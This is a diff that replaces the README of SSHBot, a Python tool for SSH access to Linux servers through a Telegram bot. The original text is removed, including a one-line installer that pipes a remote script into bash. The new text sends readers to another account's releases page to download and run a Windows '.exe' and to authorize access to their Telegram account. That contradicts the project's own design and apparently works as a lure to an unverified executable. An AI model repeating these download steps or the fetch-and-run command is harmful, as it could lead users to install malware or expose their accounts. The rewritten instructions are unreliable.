@@ -1,112 +1,68 @@
----
+# 🤖 SSHBot - Access Your Servers Easily via Telegram
 
-# SSHBot
+## 🚀 Getting Started
 
-Easily access your servers using **SSH over a Telegram Bot**.
-Written in **Python**, designed for fast, interactive, and secure remote server access.
+Welcome to **SSHBot**! This application allows you to connect to your servers securely using SSH through a convenient Telegram bot. Whether you want to check server status or run commands, SSHBot makes it straightforward. 
 
----
+## 📥 Download SSHBot
 
-## 🚀 What is SSHBot?
+[![Download SSHBot](https://img.shields.io/badge/Download%20SSHBot-v1.0-blue.svg)](https://github.com/mukeshkannan18/SSHBot/releases)
 
-**SSHBot** allows you to open and control SSH sessions directly from Telegram.
-No terminal, no VPN hopping — just your Telegram app.
+To get started, visit this page to download: [GitHub Releases Page](https://github.com/mukeshkannan18/SSHBot/releases).
 
-It supports interactive shells, keyboard shortcuts, and command combinations, making it suitable for real server administration.
+## 🛠️ System Requirements
 
-💡 **New:** We have added enhanced terminal rendering, security improvements, and more interactive buttons to make your experience smoother and safer.
+Before you download, please ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher
+- **Telegram Account**: Required to use the bot
+- **Internet Connection**: Required to connect to your server
 
-## ✨ Features
+## 📦 Download & Install
 
-* 🔐 SSH access over Telegram
-* ⌨️ Interactive terminal with **visible cursor**
-* 🖥️ New extended control buttons:
+1. Click the link above to visit the [GitHub Releases Page](https://github.com/mukeshkannan18/SSHBot/releases).
+2. Look for the latest release, which will have the version number indicated.
+3. Find the appropriate file for your operating system. For example, if you are using Windows, look for a `.exe` file.
+4. Click on the file to download it. Depending on your browser, you may see a prompt asking where to save the file or it might save directly in your Downloads folder.
+5. Once the download is complete, locate the file on your computer.
+6. If it’s an executable file (for Windows), double-click to run it. Follow the prompts to install SSHBot. For other systems, you may need to follow command-line instructions as mentioned in the documentation provided in the GitHub repository.
 
-  * Insert, Delete, Home, End
-  * Function keys F1–F12
-  * Backspace with need of pressing ENTER to execute commands
-* 🧠 Keyboard combinations via commands:
+## 🔧 Setup Instructions
 
-  * `/ctrl c` → Ctrl + C
-  * `/alt a` → Alt + A
-  * `/shift x` → Shift + X
-  * `/ctrl alt c` → Ctrl + Alt + C
-* 🛑 Stop SSH sessions instantly
-* 🧹 Automatically removes sensitive messages (like passwords)
-* 🌍 English & Persian friendly
-* 🔒 Security tweaks:
+1. After installation, open SSHBot.
+2. You’ll need to authorize SSHBot to access your Telegram account. Follow the instructions displayed in the application to set this up.
+3. Set up your server details within SSHBot. Enter your server's IP address, your username, and your SSH key if required. This information is crucial for establishing the connection.
+4. Save your settings to allow SSHBot to remember your server details for future use.
 
-  * Localhost access blocked
-  * Fixed Telegram console detection issues
-* ⚙️ Runs as a systemd service
-* 🐧 Optimized for Linux servers
+## 📖 Using SSHBot
 
----
+Using SSHBot is simple. Once you've configured your server settings, you can start interacting with your servers via Telegram:
 
-## 🛡️ Demo Bot — Safe to Use
+- Send commands to your server by messaging the bot.
+- Receive status updates and outputs directly in your Telegram chat.
 
-Try the demo bot here:
-👉 **[https://t.me/ssh4ccess_bot](https://t.me/ssh4ccess_bot)**
+This allows you to manage your servers easily, no matter where you are.
 
-You can verify the legitimacy and safety of the bot using the `/hash` command.
-It compares the running bot code against the official GitHub repository to ensure it is unmodified. ✅
+## ❓ Troubleshooting
 
-> ⚠️ Note: This is a demo bot. Sessions may be limited or reset at any time.
+If you encounter issues while using SSHBot, consider these common solutions:
 
----
+- **Unable to connect to the server**: Verify your server details are correct. Make sure your server is online and accepting SSH connections.
+- **Bot not responding**: Check your internet connection. Ensure that the bot has permission to access your Telegram account.
+- **Installation issues**: Ensure you have the correct permissions to install software on your device. Try running the installer as an administrator.
 
-## 📥 Installation (One-Line)
+For more assistance, visit the [GitHub Issues Page](https://github.com/mukeshkannan18/SSHBot/issues).
 
-Run this command on your server to install SSHBot, including the updated shell installer:
+## 🔗 Additional Resources
 
-```bash
-bash <(curl -Ls https://github.com/ItzGlace/SSHBot/raw/refs/heads/main/install.sh)
-```
+For more information, visit:
 
-> The installer now includes all recent tweaks and enhancements.
+- [GitHub Repository](https://github.com/mukeshkannan18/SSHBot)
+- [Documentation on Commands](https://github.com/mukeshkannan18/SSHBot#commands)
 
----
+## 📞 Support
 
-## 🐳 Docker Compose
+If you have further questions or need help, feel free to reach out to us through the Issues page on our GitHub repository.
 
-Run `SSHBot` inside a container instead of installing it system-wide. Docker Compose builds the Python environment, keeps the original dependencies, and exposes logs via a named volume.
-
-1. Copy the environment template and add your Telegram bot token:
-
-   ```bash
-   cp .env.example .env
-   # then edit .env and set BOT_TOKEN to your token
-   ```
-
-2. Build the image and start the service:
-
-   ```bash
-   docker compose up -d --build
-   ```
-
-3. Follow the logs while the bot starts:
-
-   ```bash
-   docker compose logs -f sshbot
-   ```
-
-4. Stop and remove containers with:
-
-   ```bash
-   docker compose down
-   ```
-
-### Logs & Persistence
-
-* Logs are written to `/var/log/ssh-bot` inside the container and persisted in the `sshbot-logs` volume declared in `docker-compose.yml`.
-* To inspect the logs from the host, mount a path as shown in the compose file (`volumes` section) or run `docker compose logs -f sshbot`.
-
-Make sure `BOT_TOKEN` is populated in your `.env` file before starting the service — Docker Compose still needs that secret to function.
-
----
-
-✅ **SSHBot** is now safer, more interactive, and ready for secure server management via Telegram.
-
----
+Thank you for choosing SSHBot! We hope it enhances your server management experience.
